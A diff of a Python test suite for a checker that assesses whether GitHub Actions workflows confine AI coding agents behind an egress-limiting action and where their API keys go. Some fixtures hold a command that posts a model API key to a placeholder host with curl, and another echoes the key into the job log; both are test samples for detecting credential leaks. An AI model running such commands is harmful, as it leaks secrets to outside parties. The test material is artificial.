@@ -109,6 +109,7 @@ class NativeFirewallTest(unittest.TestCase):
         self.assertEqual((f.kind, verdict(f), f.state), ("firewall-runner", VERIFIED, "fixed"))
         self.assertIn("technical preview", detail(f))
         self.assertIn("api.example.com", detail(f))
+        self.assertIn("printed to the job's log or saved as an artifact is not blocked", detail(f))
 
     def test_it_clears_the_egress_control_of_a_secret_too(self):
         steps = "      - run: python -m agents.fix\n        env: {KEY: '${{ secrets.MODEL_API_KEY }}'}"
@@ -341,13 +342,17 @@ class EgressActionTest(unittest.TestCase):
                     "        credentials: {username: bot, password: '${{ secrets.REGISTRY }}'}")
         self.assertEqual(verdict(self.check(action(), job_extra=services)), VERIFIED)
 
-    def test_a_credential_given_to_the_confined_command_is_cannot_tell(self):
-        inside = action(extra="        env: {REVIEW_KEY: '${{ secrets.REVIEW_KEY }}'}\n")
+    def test_a_credential_passed_to_the_confined_command_is_said_beside_the_cleared_finding(self):
+        """Until slice 2c.5 any credential in the confined step was "cannot tell". One the command can
+        read limits the network no less; the report names it among what is not blocked (D-052)."""
+        inside = action(extra="        env: {REVIEW_KEY: '${{ secrets.REVIEW_KEY }}'}\n",
+                        allow="api.example.com\n          env: REVIEW_KEY")
         f = self.check(inside)
-        self.assertEqual(verdict(f), CANNOT_TELL)
-        self.assertIn("2c.5", detail(f))
+        self.assertEqual(verdict(f), VERIFIED)
+        self.assertIn("the credentials passed to it included (secrets.REVIEW_KEY)", detail(f))
         f = self.check(action(run="claude -p '${{ secrets.REVIEW_KEY }}'"))
-        self.assertEqual(verdict(f), CANNOT_TELL)
+        self.assertEqual(verdict(f), VERIFIED)
+        self.assertIn("secrets.REVIEW_KEY", detail(f))
 
     def test_an_agent_in_another_step_is_not_met(self):
         for other in (f"      - uses: anthropics/claude-code-action@{SHA}", "      - run: npx @openai/codex exec fix"):
@@ -487,6 +492,226 @@ class EgressActionTest(unittest.TestCase):
         self.assertNotEqual(baseline.key(plain), baseline.key(moved))
 
 
+def keyed(model_keys="ANTHROPIC_API_KEY", env_input=None, step_env=None, run="claude -p 'review the change'",
+          allow="api.example.com", ref=RELEASED, extra=""):
+    """A step that uses OBAAF's egress action with `model-keys` (and `env`) inputs and a step `env`.
+    `step_env` defaults to the model key from a secret of the same name."""
+    if step_env is None:
+        step_env = {"ANTHROPIC_API_KEY": "${{ secrets.ANTHROPIC_API_KEY }}"}
+    lines = [f"      - id: agent\n        uses: Obaaf/OBAAF/actions/egress@{ref}\n"]
+    if step_env:
+        lines.append("        env:\n" + "".join(f"          {name}: {json.dumps(value)}\n"
+                                                for name, value in step_env.items()))
+    lines.append(extra)
+    lines.append(f"        with:\n          allow: {allow}\n          run: {json.dumps(run)}\n")
+    if model_keys is not None:
+        lines.append(f"          model-keys: {model_keys}\n")
+    if env_input is not None:
+        lines.append(f"          env: {env_input}\n")
+    return "".join(lines).rstrip("\n")
+
+
+def secret_control(result):
+    found = [f for f in result.findings if f.rule == "OBAAF-GHA-005"]
+    assert len(found) == 1, [(f.rule, f.kind, f.message) for f in result.findings]
+    return next(c for c in found[0].controls if c.id == "egress-enforced")
+
+
+class ModelKeysTest(unittest.TestCase):
+    """The checker reads the action's `model-keys` input (flagship slice 2c.5, decision D-052): a model
+    key named there goes to AWF's API proxy, which the command can use and cannot read, and which
+    reaches the provider's API host whatever the allow-list says. The control can be verified, with
+    that host shown beside the allow-list and the provider's channel named beside the cleared finding."""
+
+    def check(self, steps, cat=None, **kw):
+        return egress(run_check(workflow(steps, **kw), cat=cat))
+
+    def test_a_model_key_given_to_the_proxy_clears_it_and_the_report_names_the_provider(self):
+        f = self.check(CHECKOUT + "\n" + keyed())
+        self.assertEqual((f.kind, verdict(f), f.state), ("egress-action", VERIFIED, "fixed"))
+        self.assertEqual(f.facts["allow"], ["api.example.com", "api.anthropic.com (through AWF's API proxy)"])
+        for words in ("ANTHROPIC_API_KEY given to AWF's API proxy", "api.anthropic.com", "remote MCP servers",
+                      "hosted web search and fetch tools", "job's log", "DNS query"):
+            with self.subTest(words=words):
+                self.assertIn(words, detail(f))
+
+    def test_both_providers(self):
+        env = {"ANTHROPIC_API_KEY": "${{ secrets.A }}", "OPENAI_API_KEY": "${{ secrets.O }}"}
+        f = self.check(keyed(model_keys="ANTHROPIC_API_KEY,OPENAI_API_KEY", step_env=env))
+        self.assertEqual(verdict(f), VERIFIED)
+        self.assertEqual(f.facts["allow"], ["api.example.com", "api.anthropic.com (through AWF's API proxy)",
+                                            "api.openai.com (through AWF's API proxy)"])
+        self.assertIn("api.anthropic.com or api.openai.com", detail(f))
+
+    def test_the_providers_host_is_part_of_the_finding(self):
+        """What the command can reach is one of the finding's facts, as the allow-list is. (Any change to
+        the workflow file changes the finding too, through its digest.)"""
+        cat = checker.load()
+        plain = self.check(keyed(model_keys=None, step_env={}), cat=cat)
+        with_key = self.check(keyed(), cat=cat)
+        self.assertEqual(plain.facts["allow"], ["api.example.com"])
+        self.assertEqual(with_key.facts["allow"], ["api.example.com", "api.anthropic.com (through AWF's API proxy)"])
+
+    def test_a_key_written_into_run_through_the_env_context_is_passed_to_the_command(self):
+        """Found by the first review: GitHub writes a step's inputs with the env context, which holds the
+        step's own env, so `${{ env.ANTHROPIC_API_KEY }}` in `run` hands the command the key that
+        `model-keys` gives to the proxy."""
+        for written in ("${{ env.ANTHROPIC_API_KEY }}", "${{ env.anthropic_api_key }}",
+                        "${{ format('{0}', env.ANTHROPIC_API_KEY) }}", "${{ env['ANTHROPIC_API_KEY'] }}"):
+            run = f"claude -p 'review the change'\ncurl -d 'k={written}' https://api.example.com/collect"
+            result = run_check(workflow(keyed(run=run)))
+            f, control = egress(result), secret_control(result)
+            with self.subTest(written=written):
+                self.assertNotIn("goes to AWF's API proxy", control.detail)
+                self.assertIn("passed to the command in its run input, through env.ANTHROPIC_API_KEY", control.detail)
+                self.assertIn("the credentials passed to it included (secrets.ANTHROPIC_API_KEY)", detail(f))
+        # The whole env context: every credential of the step's env reaches the command, and the
+        # checker cannot name what part of it is used.
+        f = self.check(keyed(run="claude -p '${{ toJSON(env) }}'"))
+        self.assertEqual(verdict(f), CANNOT_TELL)
+        self.assertIn("whole env context", detail(f))
+        # A secret named under neither input, written in through env, is passed too.
+        env = {"REVIEW_KEY": "${{ secrets.REVIEW_KEY }}"}
+        control = secret_control(run_check(workflow(keyed(model_keys=None, step_env=env,
+                                                          run="claude -p 'use ${{ env.REVIEW_KEY }}'"))))
+        self.assertNotIn("named under neither", control.detail)
+        self.assertIn("secrets.REVIEW_KEY is passed to the command in its run input, through env.REVIEW_KEY",
+                      control.detail)
+        # github.token through env: the egress finding names it, though there is no secret finding.
+        steps = keyed(model_keys=None, step_env={"TOK": "${{ github.token }}"}, run='claude -p "use ${{ env.TOK }}"')
+        f = self.check(steps)
+        self.assertIn("the credentials passed to it included (github.token)", detail(f))
+        # In another input, through env: not placed.
+        steps = keyed().replace("          allow:", "          note: '${{ env.ANTHROPIC_API_KEY }}'\n          allow:")
+        self.assertEqual(verdict(self.check(steps)), CANNOT_TELL)
+
+    def test_the_secret_finding_says_what_could_not_be_placed(self):
+        """Found by the first review: a credential the checker could not place was named nowhere."""
+        steps = keyed(extra="        if: github.token != ''\n").replace(
+            "          allow:", "          note: '${{ secrets.OTHER }}'\n          allow:")
+        control = secret_control(run_check(workflow(steps)))
+        self.assertIn("the checker could not place", control.detail)
+        self.assertIn("secrets.OTHER", control.detail)
+        self.assertIn("github.token", control.detail)
+        control = secret_control(run_check(workflow(keyed(model_keys="GEMINI_API_KEY"))))
+        self.assertIn("the action would refuse to run", control.detail)
+
+    def test_a_name_not_written_as_text_is_cannot_tell(self):
+        """Found by the second review: `true:` was read as a boolean and compared as "True"."""
+        steps = keyed(model_keys=None, step_env={}, env_input="'true'").replace(
+            "        with:", "        env:\n          true: ${{ secrets.X }}\n        with:")
+        f = self.check(steps)
+        self.assertEqual(verdict(f), CANNOT_TELL)
+        self.assertIn("not written as text", detail(f))
+
+    def test_a_key_written_into_run_is_still_named_beside_the_provider(self):
+        run = "claude -p 'review'\necho '${{ env.ANTHROPIC_API_KEY }}'"
+        f = self.check(keyed(run=run))
+        self.assertIn("with ANTHROPIC_API_KEY given to AWF's API proxy", detail(f))
+
+    def test_long_lists_say_how_many_more(self):
+        env = {f"K{n}": f"${{{{ secrets.K{n} }}}}" for n in range(5)}
+        f = self.check(keyed(model_keys=None, step_env=env, env_input=",".join(env)))
+        self.assertEqual(verdict(f), VERIFIED)
+        self.assertIn("secrets.K0, secrets.K1, secrets.K2 and 2 more", detail(f))
+
+    def test_secret_findings_say_where_the_key_goes_whatever_the_verdict(self):
+        for cat, expected in ((None, VERIFIED), (checker.load(), CANNOT_TELL)):
+            control = secret_control(run_check(workflow(keyed()), cat=cat))
+            with self.subTest(expected=expected):
+                self.assertEqual(control.verdict, expected)
+                self.assertIn("ANTHROPIC_API_KEY (secrets.ANTHROPIC_API_KEY) goes to AWF's API proxy, which the "
+                              "command can use and cannot read", control.detail)
+        env = {"REVIEW_KEY": "${{ secrets.REVIEW_KEY }}"}
+        control = secret_control(run_check(workflow(keyed(model_keys=None, env_input="REVIEW_KEY", step_env=env))))
+        self.assertIn("secrets.REVIEW_KEY is passed to the command as REVIEW_KEY", control.detail)
+        # The egress finding's own control does not carry the routes; the secret finding's does.
+        self.assertNotIn("Where the confined step's credentials go", detail(self.check(keyed())))
+
+    def test_a_model_key_under_env_or_a_name_model_keys_does_not_take_is_not_met(self):
+        """The action refuses them, so it does not run."""
+        cases = {
+            "a model key under env": keyed(model_keys=None, env_input="ANTHROPIC_API_KEY"),
+            "under both inputs": keyed(env_input="ANTHROPIC_API_KEY"),
+            "a GitHub token under env": keyed(model_keys=None, env_input="GH_TOKEN",
+                                              step_env={"GH_TOKEN": "${{ github.token }}"}),
+            "a provider the action has not tested": keyed(model_keys="GEMINI_API_KEY",
+                                                          step_env={"GEMINI_API_KEY": "${{ secrets.G }}"}),
+            "another case": keyed(model_keys="anthropic_api_key",
+                                  step_env={"anthropic_api_key": "${{ secrets.A }}"}),
+            "not a name": keyed(model_keys=None, env_input="'A-B'", step_env={"A-B": "${{ secrets.A }}"}),
+        }
+        for what, steps in cases.items():
+            f = self.check(steps)
+            with self.subTest(what=what):
+                self.assertEqual(verdict(f), NOT_MET)
+                self.assertIn("refuses to run", detail(f))
+
+    def test_a_model_key_no_env_sets_is_not_met(self):
+        f = self.check(keyed(step_env={}, run="./scripts/x.sh"))
+        self.assertEqual(verdict(f), NOT_MET)
+        self.assertIn("no env of the step, the job or the workflow sets it", detail(f))
+        # Set in the step's env under another case: the action reads names as written.
+        f = self.check(keyed(step_env={"anthropic_api_key": "${{ secrets.A }}"}))
+        self.assertEqual(verdict(f), NOT_MET)
+        # Set in the job's env as text, or in an env computed when the job runs: not refused here.
+        for job_env in ("    env: {ANTHROPIC_API_KEY: not-a-secret}", "    env: ${{ fromJSON(vars.ENV) }}"):
+            f = self.check(keyed(step_env={}), job_extra=job_env)
+            with self.subTest(job_env=job_env):
+                self.assertNotIn("refuses to run", detail(f))
+
+    def test_a_secret_named_under_neither_input_reaches_nothing(self):
+        """It is not evidence that the agent is the confined command: with no agent the checker knows,
+        it is "cannot tell", as for a job with no key at all."""
+        env = {"REVIEW_KEY": "${{ secrets.REVIEW_KEY }}"}
+        f = self.check(keyed(model_keys=None, step_env=env, run="./scripts/home-grown.sh"))
+        self.assertEqual(verdict(f), CANNOT_TELL)
+        self.assertIn("needs no key", detail(f))
+        self.assertEqual(verdict(self.check(keyed(model_keys=None, step_env=env))), VERIFIED)
+        control = secret_control(run_check(workflow(keyed(model_keys=None, step_env=env))))
+        self.assertIn("REVIEW_KEY (secrets.REVIEW_KEY) is named under neither env nor model-keys", control.detail)
+
+    def test_a_key_given_to_the_proxy_is_evidence_that_the_agent_is_inside(self):
+        f = self.check(keyed(run="./scripts/home-grown.sh"))
+        self.assertEqual(verdict(f), VERIFIED)
+
+    def test_what_the_checker_cannot_place_is_cannot_tell(self):
+        cases = {
+            "model-keys computed": keyed(model_keys="'${{ vars.KEYS }}'"),
+            "env computed": keyed(model_keys=None, env_input="'${{ vars.NAMES }}'",
+                                  step_env={"REVIEW_KEY": "${{ secrets.R }}"}),
+            "model-keys as a list": keyed(model_keys="[ANTHROPIC_API_KEY]"),
+            "names differing only in case": keyed(step_env={"ANTHROPIC_API_KEY": "${{ secrets.A }}",
+                                                            "Anthropic_Api_Key": "${{ secrets.B }}"}),
+            "another input": keyed().replace("          allow:", "          note: '${{ secrets.X }}'\n          allow:"),
+            "a computed env": keyed(step_env={}).replace(
+                "        with:", "        env: ${{ fromJSON(secrets.ENV) }}\n        with:"),
+            "a condition": keyed(extra="        if: github.token != ''\n"),
+        }
+        for what, steps in cases.items():
+            f = self.check(steps)
+            with self.subTest(what=what):
+                self.assertEqual(verdict(f), CANNOT_TELL, detail(f))
+
+    def test_a_credential_outside_the_confined_command_is_still_not_met(self):
+        other = "      - run: gh pr view\n        env: {GH_TOKEN: '${{ github.token }}'}\n"
+        f = self.check(other + keyed())
+        self.assertEqual(verdict(f), NOT_MET)
+        self.assertIn("outside the confined command", detail(f))
+
+    def test_the_checker_reads_names_as_the_action_does(self):
+        """The checker's copy of the action's lists, kept the same by this test."""
+        import importlib.util
+        root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+        spec = importlib.util.spec_from_file_location("obaaf_egress_action_lists",
+                                                      os.path.join(root, "actions", "egress", "egress.py"))
+        action_mod = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(action_mod)
+        self.assertEqual(egress_mod.MODEL_KEYS, action_mod.MODEL_KEYS)
+        self.assertEqual(egress_mod.WITHHELD_BY_AWF, action_mod.WITHHELD_BY_AWF)
+        self.assertEqual(egress_mod.NAME_RE.pattern, action_mod._NAME_RE.pattern)
+
+
 class HardenRunnerTest(unittest.TestCase):
     """Harden-Runner covers the job only when four things can be established; the repository's tier
     never can be from the workflow, so it is "cannot tell" at best."""
@@ -623,6 +848,124 @@ class ReleaseDataTest(unittest.TestCase):
 
     def test_no_commit_of_the_egress_action_is_listed_yet(self):
         self.assertEqual(checker.load().detection["egress_action_releases"], [])
+
+    def test_listed_commits_of_the_egress_action_are_at_or_after_the_floor(self):
+        """Only a commit at or after the merge of slice 2c.4 may be listed: the checker reads the
+        action's model-keys input and describes its resolver, both of which exist from there (slice
+        2c.5). Checked against the repository's history, which CI's test job fetches in full."""
+        detection = checker.load().detection
+        self.assertEqual(detection["egress_action_floor"], FLOOR)
+        self.assertEqual(floor_problems(detection["egress_action_releases"], FLOOR), [])
+
+    def test_the_floor_check_refuses_an_older_commit(self):
+        if not has_history(FLOOR):
+            self.skipTest("this checkout does not hold the repository's history (CI's test job fetches it)")
+        self.assertEqual(floor_problems([FLOOR, AFTER_FLOOR], FLOOR), [])
+        problems = floor_problems([BEFORE_FLOOR, "0" * 40, "v1"], FLOOR)
+        self.assertEqual(len(problems), 3, problems)
+        self.assertIn("not at or after", problems[0])
+        self.assertEqual(lists_differ(FLOOR), "")
+        self.assertEqual(lists_differ(AFTER_FLOOR), "")
+
+
+FLOOR = "f0bfbd79398a5950bb3c72860e98dfdaa66c929f"          # the merge of #128, slice 2c.4
+AFTER_FLOOR = "31bf6d106ad0070edd1078b716579afebeab2734"    # `flagship` when slice 2c.5 began
+BEFORE_FLOOR = "209fb5990e2273408b53619487acd883fe96fc0e"   # the merge of #119, slice 2c.2: before 2c.4
+
+
+def has_history(commit):
+    import subprocess
+    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+    try:
+        found = subprocess.run(["git", "-C", root, "cat-file", "-e", f"{commit}^{{commit}}"],
+                               capture_output=True, timeout=30)
+    except (OSError, subprocess.SubprocessError):
+        return False
+    return found.returncode == 0
+
+
+def floor_problems(releases, floor):
+    """Why each listed commit may not be listed: not a full commit name, or not at or after `floor`
+    in this repository's history. With commits listed and no history to check them against, that
+    is a problem too: the check fails closed."""
+    import subprocess
+    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+    problems = []
+    if releases and not has_history(floor):
+        return [f"the repository's history is not here to check {len(releases)} listed commit(s) against {floor[:12]}"]
+    for sha in releases:
+        if not isinstance(sha, str) or not __import__("re").fullmatch(r"[0-9a-f]{40}", sha):
+            problems.append(f"{sha!r} is not a full commit name")
+            continue
+        try:
+            found = subprocess.run(["git", "-C", root, "merge-base", "--is-ancestor", floor, sha],
+                                   capture_output=True, timeout=30)
+        except (OSError, subprocess.SubprocessError) as exc:
+            problems.append(f"{sha[:12]} could not be checked ({exc})")
+            continue
+        if found.returncode != 0:
+            problems.append(f"{sha[:12]} is not at or after {floor[:12]}, the merge of slice 2c.4")
+            continue
+        differs = lists_differ(sha)
+        if differs:
+            problems.append(f"{sha[:12]}: {differs}")
+    return problems
+
+
+def lists_differ(sha):
+    """How the action at `sha` reads its inputs differently from the checker's copy of its lists
+    (found by the first review: the floor alone would let a later commit that changed them be listed),
+    or an empty string."""
+    import importlib.util
+    import subprocess
+    import tempfile
+    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+    try:
+        shown = subprocess.run(["git", "-C", root, "show", f"{sha}:actions/egress/egress.py"],
+                               capture_output=True, timeout=30)
+    except (OSError, subprocess.SubprocessError) as exc:
+        return f"its egress.py could not be read ({exc})"
+    if shown.returncode != 0:
+        return "it has no actions/egress/egress.py"
+    with tempfile.TemporaryDirectory() as tmp:
+        path = os.path.join(tmp, "egress_at_commit.py")
+        with open(path, "wb") as handle:
+            handle.write(shown.stdout)
+        spec = importlib.util.spec_from_file_location("obaaf_egress_at_commit", path)
+        module = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(module)
+    for name, mine in (("MODEL_KEYS", egress_mod.MODEL_KEYS), ("WITHHELD_BY_AWF", egress_mod.WITHHELD_BY_AWF)):
+        if getattr(module, name, None) != mine:
+            return f"its {name} is not the checker's"
+    if getattr(getattr(module, "_NAME_RE", None), "pattern", None) != egress_mod.NAME_RE.pattern:
+        return "its _NAME_RE is not the checker's"
+    # How it reads the two inputs, and which inputs it has, against the floor: a change there means the
+    # checker must be looked at again before the commit is listed (found by the second review).
+    for what, mine, floor in ((f"{sha}:actions/egress/egress.py", None, f"{FLOOR}:actions/egress/egress.py"),
+                              (f"{sha}:actions/egress/action.yml", None, f"{FLOOR}:actions/egress/action.yml")):
+        if reading(what) != reading(floor):
+            return f"{what.split(':', 1)[1]} reads its inputs differently from the floor's"
+    return ""
+
+
+def reading(spec):
+    """Part of what decides how the action reads `env` and `model-keys`, in one file at one commit:
+    the two parsing functions of egress.py, as syntax trees (a docstring counts), or the input names
+    of action.yml. Not compared: what `run()` does with what they return, or how action.yml wires the
+    inputs to the script; the escape tests a commit must pass before it is listed cover those."""
+    import ast
+    import subprocess
+    import yaml
+    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+    shown = subprocess.run(["git", "-C", root, "show", spec], capture_output=True, timeout=30)
+    if shown.returncode != 0:
+        return None
+    text = shown.stdout.decode("utf-8")
+    if spec.endswith(".yml"):
+        return sorted((yaml.safe_load(text) or {}).get("inputs", {}))
+    tree = ast.parse(text)
+    return [ast.dump(node) for node in tree.body
+            if isinstance(node, ast.FunctionDef) and node.name in ("parse_env_names", "parse_model_keys")]
 
 
 if __name__ == "__main__":
